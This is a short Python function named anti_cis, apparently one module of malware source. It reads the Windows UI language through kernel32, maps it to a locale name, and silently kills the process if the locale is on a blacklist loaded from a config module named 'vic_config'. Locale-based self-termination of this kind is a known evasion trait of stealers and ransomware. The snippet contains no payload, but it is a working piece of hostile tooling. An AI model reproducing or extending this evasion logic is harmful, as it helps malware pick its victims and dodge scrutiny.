import ctypes
from vic_config import config

def anti_cis() -> None:
    try:
        kernel32 = ctypes.windll.kernel32 
        lang_id: int = kernel32.GetUserDefaultUILanguage()
        buf = ctypes.create_unicode_buffer(85)
        kernel32.LCIDToLocaleName(lang_id, buf, 85, 0)
    except Exception as err:
        print(err)
        return None
        
    if buf.value.lower() in config.get("BLACKLIST"):
        ctypes.windll.kernel32.ExitProcess(0)